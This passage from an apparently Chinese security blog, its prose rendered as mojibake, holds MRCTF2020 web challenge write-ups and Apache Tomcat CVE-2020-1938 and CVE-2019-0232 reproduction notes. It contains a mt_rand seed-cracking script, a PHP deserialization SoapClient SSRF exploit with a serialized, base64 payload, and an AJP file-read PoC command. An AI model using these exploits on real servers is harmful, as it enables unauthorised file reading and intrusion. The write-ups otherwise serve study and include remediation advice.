mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure>

<p>è€ƒå¯Ÿ<code>ä¼ªéšæœºæ•°æ¼æ´</code>ï¼ŒBJD2ndè€ƒå¯Ÿè¿‡</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span></span><br><span class="line">str2 = <span class="string">'KVQP0LdJKRaV3n9D'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res += str(j) + <span class="string">' '</span> + str(j) + <span class="string">' '</span> + <span class="string">'0'</span> + <span class="string">' '</span> + str(len(str1) - <span class="number">1</span>) + <span class="string">' '</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p>ç„¶åè·å¾—èƒ½è¢«<code>php_mt_seed</code>è¯†åˆ«çš„æ•°æ®</p>
<p><img src="/.com//5.png" alt="image-20200407000957313"></p>
<p>å†çˆ†ç ´å‡ºkey</p>
<p><img src="/.com//6.png" alt="image-20200407001413239"></p>
<p>ç„¶åå°±å¯ä»¥å¾—å‡ºprivate_key</p>
<p>ä½†æ˜¯è¿™é‡Œ<strong>è¦å…ˆè·å¾—å…¬é’¥ï¼Œæ‰èƒ½å†è·å¾—ç§é’¥</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> public_key();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br></pre></td></tr></table></figure>





<h2 id="MRCTF2020-Ezpop-Reveng"><a href="#MRCTF2020-Ezpop-Reveng" class="headerlink" title="[MRCTF2020]Ezpop_Reveng"></a>[MRCTF2020]Ezpop_Reveng</h2><p>è€ƒå¯Ÿï¼šSoap_Clientç±»ï¼Œä»£ç å®¡è®¡ï¼Œååºåˆ—åŒ–</p>
<p><img src="/.com//7.png" alt="image-20200408204709701"></p>
<p>åƒè¿™æ ·å­æœ‰CMsçš„ä¸€èˆ¬éƒ½ä¼šæœ‰æºç ï¼Œ<code>www.zip</code>è·å¾—æºç </p>
<p>åœ¨<code>./usr/plugins/HelloWorld/Plugin.php</code>ä¸­çœ‹åˆ°æ³¨å…¥ç‚¹</p>
<p><img src="/.com//8.png" alt="image-20200408205603622"></p>
<p>ç„¶åæˆ‘ä»¬æ‰¾åˆ°popé“¾ï¼Œåœ¨æ ¹ç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ª<code>flag.php</code></p>
<p><img src="/.com//9.png" alt="image-20200408211141319"></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡SSRFæ¥è·å¾—flag,è¿™é‡Œå°±éœ€è¦ä½¿ç”¨åˆ°<code>soapClient</code>ç±»ï¼Œæ‰€ä»¥è¿™ä¸ªpopé“¾çš„ç»“å±€å°±æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ä¸ªç±»ï¼Œä½¿å…¶çš„æŸä¸ªå˜é‡ä¸º<code>soapclient</code>ï¼Œå¹¶ä¸”è¯¥å˜é‡è¿˜ä¼šè°ƒç”¨æŸä¸ªæ–¹æ³•ï¼Œä¸ºäº†è§¦å‘<code>soapClient</code>ç±»çš„<code>call</code>æ–¹æ³•</p>
<p>åœ¨<code>plugin.php</code>ä¸­</p>
<p><img src="/.com//10.png" alt="image-20200408211637970"></p>
<p>è¿™ä¸ª<code>__wakeup()</code>ä¸­çš„<code>Typecho_Db</code>å¯¹è±¡ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹</p>
<p><img src="/.com//11.png" alt="image-20200408211847102"></p>
<p>è¿™é‡Œå¦‚æœæˆ‘ä»¬ä½¿å¾—<code>$adapterName</code>ä¸ºæŸä¸ªç±»ã€‚é‚£ä¹ˆå°±ä¼šè§¦å‘é‚£ä¸ªç±»ä¸­çš„<code>__toString()</code></p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦ä½¿å¾—å¯¹è±¡<code>HelloWorld_DB</code>ä¸­çš„<code>$coincidence=array(&#39;hello&#39;=&gt; æŸä¸ªç±»çš„å®ä¾‹å¯¹è±¡ )</code></p>
<p>å…¨å±€æœç´¢<code>__toString</code></p>
<p><img src="/.com//12.png" alt="image-20200408212247204"></p>
<p>è·Ÿè¿›ï¼Œåœ¨ç±»<code>Typecho_Db_Query</code>ä¸­çš„<code>__toString()</code></p>
<p><img src="/.com//13.png" alt="image-20200408212325318"></p>
<p>è¿™é‡Œçš„<code>$this-&gt;_sqlPreBuild[&#39;action&#39;]</code>å’Œ<code>$this-&gt;_adapter</code>æ˜¯å¯æ§çš„ã€‚ </p>
<p><img src="/.com//14.png" alt="image-20200408213444175"></p>
<p>é‚£æˆ‘ä»¬å¯ä»¥ä»¤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_sqlPreBuild=[<span class="string">'action'</span>=&gt;<span class="string">'SELECT'</span>]</span><br><span class="line"><span class="keyword">$this</span>-&gt;_adapter=SoapClient()</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·å°±ä¼šè§¦å‘<code>SoapClient</code>çš„<code>_call()</code>ï¼Œä»¥è§¦å‘<code>SSRF</code></p>
<p>EXP:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = [<span class="string">'hello'</span>=&gt;<span class="keyword">new</span> Typecho_Db_Query()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">'http://127.0.0.1/flag.php'</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">            <span class="string">'Cookie: PHPSESSID=11111111111111111111111111'</span></span><br><span class="line">        );</span><br><span class="line">        $b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'HyyMbb^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter=$b;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild = [<span class="string">'action'</span>=&gt;<span class="string">'SELECT'</span>];</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒ:<a href="https://www.cnblogs.com/fish-pompom/p/11126473.html" target="_blank" rel="noopener">https://www.cnblogs.com/fish-pompom/p/11126473.html</a></p>
<p>è¿™ä¸ªæ—¶å€™å…ˆç”Ÿæˆåºåˆ—åŒ–çš„å€¼ï¼Œç„¶åå†åšä¸€äº›å°å¤„ç†<br>æˆ‘ä»¬éƒ½çŸ¥é“ç§æœ‰å˜é‡ç±»åçš„å‰åéƒ½æœ‰%00ï¼Œä½†æ˜¯æŸäº›ç‰¹å®šç‰ˆæœ¬çš„æƒ…å†µä¸‹ï¼Œè¿™æ ·ä¹Ÿä¼šå‡ºé”™<br>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬éœ€è¦å°†sæ”¹ä¸ºSï¼Œå¹¶æ·»åŠ <code>\00</code>ï¼Œ</p>
<p><img src="/.com//15.png" alt="image-20200408220747609"></p>
<p><code>%00</code>ä¼šè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ç”¨<code>\00</code>æ¥ä»£æ›¿</p>
<p>å¾—åˆ°äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$aaa = <span class="string">'O:13:"HelloWorld_DB":1:&#123;S:26:"\00HelloWorld_DB\00coincidence";a:1:&#123;s:5:"hello";O:16:"Typecho_Db_Query":2:&#123;S:30:"\00Typecho_Db_Query\00_sqlPreBuild";a:1:&#123;s:6:"action";s:6:"SELECT";&#125;S:26:"\00Typecho_Db_Query\00_adapter";O:10:"SoapClient":5:&#123;s:3:"uri";s:4:"aaab";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:15:"_stream_context";i:0;s:11:"_user_agent";s:79:"wupco^^X-Forwarded-For: 127.0.0.1^^Cookie: PHPSESSID=11111111111111111111111111";s:13:"_soap_version";i:1;&#125;&#125;&#125;&#125;'</span>;</span><br></pre></td></tr></table></figure>



<p>ç„¶å</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$aaa = <span class="string">'O:13:"HelloWorld_DB":1:&#123;S:26:"\00HelloWorld_DB\00coincidence";a:1:&#123;s:5:"hello";O:16:"Typecho_Db_Query":2:&#123;S:30:"\00Typecho_Db_Query\00_sqlPreBuild";a:1:&#123;s:6:"action";s:6:"SELECT";&#125;S:26:"\00Typecho_Db_Query\00_adapter";O:10:"SoapClient":5:&#123;s:3:"uri";s:4:"aaab";s:8:"location";s:25:"http://127.0.0.1/flag.php";s:15:"_stream_context";i:0;s:11:"_user_agent";s:79:"wupco^^X-Forwarded-For: 127.0.0.1^^Cookie: PHPSESSID=11111111111111111111111111";s:13:"_soap_version";i:1;&#125;&#125;&#125;&#125;'</span>;</span><br><span class="line"></span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa);</span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $aaa;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  base64_encode($aaa);</span><br></pre></td></tr></table></figure>



<p>è·å¾—exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C0incid3nc3=TzoxMzoiSGVsbG9Xb3JsZF9EQiI6MTp7UzoyNjoiXDAwSGVsbG9Xb3JsZF9EQlwwMGNvaW5jaWRlbmNlIjthOjE6e3M6NToiaGVsbG8iO086MTY6IlR5cGVjaG9fRGJfUXVlcnkiOjI6e1M6MzA6IlwwMFR5cGVjaG9fRGJfUXVlcnlcMDBfc3FsUHJlQnVpbGQiO2E6MTp7czo2OiJhY3Rpb24iO3M6NjoiU0VMRUNUIjt9UzoyNjoiXDAwVHlwZWNob19EYl9RdWVyeVwwMF9hZGFwdGVyIjtPOjEwOiJTb2FwQ2xpZW50Ijo1OntzOjM6InVyaSI7czo0OiJhYWFiIjtzOjg6ImxvY2F0aW9uIjtzOjI1OiJodHRwOi8vMTI3LjAuMC4xL2ZsYWcucGhwIjtzOjE1OiJfc3RyZWFtX2NvbnRleHQiO2k6MDtzOjExOiJfdXNlcl9hZ2VudCI7czo3OToid3VwY28NClgtRm9yd2FyZGVkLUZvcjogMTI3LjAuMC4xDQpDb29raWU6IFBIUFNFU1NJRD0xMTExMTExMTExMTExMTExMTExMTExMTExMSI7czoxMzoiX3NvYXBfdmVyc2lvbiI7aToxO319fX0=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHPSESSION=<span class="number">11111111111111111111111111</span></span><br></pre></td></tr></table></figure>



<p>è®¿é—®<code>page_admin</code></p>
<p><img src="/.com//16.png" alt="image-20200408221134419"></p>
<p>å› ä¸ºæˆ‘ä»¬çš„<code>soapClient</code>çš„<code>PHPSESSION=11111111111111111111111111</code></p>
<p>ä¿®æ”¹session</p>
<p><img src="/.com//17.png" alt="image-20200408221537755"></p>
<p><img src="/.com//18.png" alt="image-20200408221603444"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/09/MRCTF2020-web/" data-id="ck8sqr5i9000ekou50zqy3573" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CVE-2020-1938" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/09/CVE-2020-1938/" class="article-date">
  <time datetime="2020-04-09T02:52:34.000Z" itemprop="datePublished">2020-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/09/CVE-2020-1938/">CVE-2020-1938</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h1><p>æ¼æ´ç®€ä»‹ï¼š</p>
<p>cve-2020-1938æ˜¯ä¸€ä¸ªå‡ºç°åœ¨Apache-Tomcat-Ajpçš„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´è¯»å–åŒ…å«Tomcatä¸Šæ‰€æœ‰çš„webappç›®å½•ä¸‹çš„ä»»æ„æ–‡ä»¶ï¼Œå…¥ï¼šwebappé…ç½®æ–‡ä»¶æˆ–æºä»£ç ã€‚</p>
<p>ç”±äºTomcaté»˜è®¤å¼€å¯çš„AJPæœåŠ¡ï¼ˆ8009ç«¯å£ï¼‰å­˜åœ¨ä¸€å¤„æ–‡ä»¶åŒ…å«ç¼ºé™·ï¼Œæ”»å‡»è€…å¯æ„é€ æ¶æ„çš„è¯·æ±‚åŒ…è¿›è¡Œæ–‡ä»¶åŒ…å«æ“ä½œï¼Œè¿›è€Œè¯»å–å—å½±å“TomcatæœåŠ¡å™¨ä¸Šçš„Webç›®å½•æ–‡ä»¶ã€‚</p>
<h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="0x01-å½±å“èŒƒå›´"><a href="#0x01-å½±å“èŒƒå›´" class="headerlink" title="0x01 å½±å“èŒƒå›´"></a>0x01 å½±å“èŒƒå›´</h2><p>ã€€ã€€Apache Tomcat 6</p>
<p>ã€€ã€€Apache Tomcat 7 &lt; 7.0.100</p>
<p>ã€€ã€€Apache Tomcat 8 &lt; 8.5.51</p>
<p>ã€€ã€€Apache Tomcat 9 &lt; 9.0.31</p>
<h2 id="0x02-æ¼æ´å¤ç°"><a href="#0x02-æ¼æ´å¤ç°" class="headerlink" title="0x02 æ¼æ´å¤ç°"></a>0x02 æ¼æ´å¤ç°</h2><p>å¯åŠ¨tomcatï¼Œè®¿é—®<code>http://localhost:8080</code></p>
<p><img src="/.com//1.png" alt="image-20200404141740070"></p>
<p>æ‰«æä¼šçœ‹åˆ°è‡ªå¯åŠ¨çš„ç«¯å£<code>8009</code></p>
<p><img src="/.com//2.png" alt="image-20200404142002932"></p>
<p>ä½¿ç”¨POC:</p>
<p><a href="https://github.com/0nise/CVE-2020-1938" target="_blank" rel="noopener">https://github.com/0nise/CVE-2020-1938</a></p>
<p><a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi" target="_blank" rel="noopener">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python CNVD<span class="number">-2020</span><span class="number">-10487</span>-Tomcat-Ajp-lfi.py -p <span class="number">8009</span> -f WEB-INF/web.xml <span class="number">192.168</span><span class="number">.0</span><span class="number">.13</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//3.png" alt="image-20200404145610383"></p>
<p>æ–‡ä»¶è¯»å–æˆåŠŸ</p>
<h2 id="0x03-ä¿®å¤å»ºè®®"><a href="#0x03-ä¿®å¤å»ºè®®" class="headerlink" title="0x03 ä¿®å¤å»ºè®®"></a>0x03 ä¿®å¤å»ºè®®</h2><p>ã€€ã€€1ã€ç¦ç”¨AIPåè®®ç«¯å£ï¼Œåœ¨conf/server.xmlé…ç½®æ–‡ä»¶ä¸­æ³¨é‡Šæ‰&lt;Connector port=â€8009â€ protocol=â€AJP/1.3â€redirectPort=â€8443â€ /&gt;</p>
<p>ã€€ã€€2ã€å‡çº§å®˜æ–¹æœ€æ–°ç‰ˆæœ¬ã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/04/09/CVE-2020-1938/" data-id="ck8sqr5hh0004kou5eh8z954y" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CVE-2019-0232" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/09/CVE-2019-0232/" class="article-date">
  <time datetime="2020-04-09T02:43:59.000Z" itemprop="datePublished">2020-04-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/04/09/CVE-2019-0232/">CVE-2019-0232</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2019-0232"><a href="#CVE-2019-0232" class="headerlink" title="CVE-2019-0232"></a>CVE-2019-0232</h1><p>Apache Tomcat è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-0232ï¼‰</p>
<p>æ¼æ´ç¯å¢ƒæ­å»ºåŠå…¶æ¼æ´å¤ç°</p>
<p>CVE-2019-0232æ¼æ´æ˜¯ç”±äºTmocat CGIå°†å‘½ä»¤è¡Œå‚æ•°ä¼ é€’ç»™Windowsç¨‹åºçš„æ–¹å¼å­˜åœ¨é”™è¯¯ï¼Œä½¿å¾—CHIServlerè¢«å‘½ä»¤æ³¨å…¥å½±å“ã€‚</p>
<p>è¯¥æ¼æ´åªå½±å“Windowså¹³å°ï¼Œè¦æ±‚å¯ç”¨äº†CGIServletå’ŒenableCmdLineArgumentså‚æ•°ã€‚ä½†æ˜¯CGIServletå’ŒenableCmdLineArgumentså‚æ•°é»˜è®¤æƒ…å†µä¸‹éƒ½ä¸å¯ç”¨ã€‚</p>
<p>ã€€ã€€æ¼æ´å½±å“èŒƒå›´ï¼š</p>
<p>ã€€ã€€   Apache Tomcat 9.0.0.M1 to 9.0.17</p>
<p>â€‹           Apache Tomcat 8.5.0 to 8.5.39</p>
<p>ã€€ã€€   Apache Tomcat 7.0.0 to 7.0.93</p>
<h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è§¦å‘è¯¥æ¼æ´éœ€è¦åŒæ—¶æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<p>1.ç³»ç»Ÿä¸ºWindows</p>
<p>2.å¯ç”¨äº†CGI Servletï¼ˆé»˜è®¤ä¸ºå…³é—­ï¼‰</p>
<p>3.å¯ç”¨äº†enableCmdLineArgumentsï¼ˆTomcat 9.0.*åŠå®˜æ–¹æœªæ¥å‘å¸ƒç‰ˆæœ¬é»˜è®¤ä¸ºå…³é—­ï¼‰</p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>windows7çš„ç¯å¢ƒ</p>
<p><img src="/.com//2.png" alt="image-20200404133916441"></p>
<p>ä¸‹è½½å¹¶å®‰è£…jdkï¼Œæˆ‘ç°åœ¨çš„jdkæ˜¯jdk1.8</p>
<p>ç„¶åé…ç½®jdkçš„ç¯å¢ƒï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">JAVA_HOME C:\Program Files\Java\jdk1<span class="number">.8</span><span class="number">.0_201</span></span><br><span class="line">JRE_HOME  C:\Program Files\Java\jdk1<span class="number">.8</span><span class="number">.0_201</span>\jre</span><br><span class="line">CLASSPATH .;%JAVA_HOME%\lib;%JAVA_HOME%\lib\tools.jar</span><br><span class="line">path       ;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;</span><br></pre></td></tr></table></figure>



<p><img src="/.com//3.png" alt="image-20200404134220492"></p>
<p>é…ç½®tomcatçš„ç¯å¢ƒï¼Œæˆ‘é€‰æ‹©çš„tomcat9.0.13   <a href="https://archive.apache.org/dist/tomcat/" target="_blank" rel="noopener">TOMCATä¸‹è½½åœ°å€</a></p>
<p>è®°å¾—è¦åˆ°æ¯ä¸ªç‰ˆæœ¬çš„<code>binç›®å½•</code>ä¸‹ä¸‹è½½å¯¹åº”windowsç‰ˆæœ¬çš„tomcat</p>
<p><img src="/.com//4.png" alt="image-20200404134452328"></p>
<p>ç„¶åä¸‹è½½è§£å‹åï¼Œè¿›å…¥binç›®å½•</p>
<p><img src="/.com//5.png" alt="image-20200404134551659"></p>
<p>æ‰“å¼€<code>startup.bat</code></p>
<p><img src="/.com//6.png" alt="image-20200404134638601"></p>
<p>å¯åŠ¨æˆåŠŸ</p>
<p>ç„¶åå…ˆå…³é—­tomcatï¼Œé…ç½®æ¼æ´ç¯å¢ƒ</p>
<p>ï¼ˆ1ï¼‰è¿›å…¥<code>conf/web.xml</code>ï¼Œä¿®æ”¹CGIé…ç½®</p>
<p>387è¡Œ</p>
<p><img src="/.com//7.png" alt="image-20200404134920285"></p>
<p>439è¡Œï¼Œå…³é—­æ³¨é‡Š</p>
<p><img src="/.com//8.png" alt="image-20200404135013434"></p>
<p>ï¼ˆ2ï¼‰ä¿®æ”¹<code>Content.xml</code></p>
<p><img src="/.com//9.png" alt="image-20200404135056177"></p>
<p>æ·»åŠ <code>privileged=&quot;true&quot;</code></p>
<p>(3)åˆ›å»ºä¸€ä¸ª<code>cgi-bin</code>ç›®å½•åœ¨<code>webapps/ROOT/WEB-INF</code>ä¸‹</p>
<p><img src="/.com//10.png" alt="image-20200404135233074"></p>
<p>(4)å†™å…¥ä¸€ä¸ªæµ‹è¯•ç”¨çš„æ–‡ä»¶<code>hello.bat</code></p>
<p><img src="/.com//11.png" alt="image-20200404135313981"></p>
<p>(5)é‡å¯tomcatï¼Œå†™å…¥payload</p>
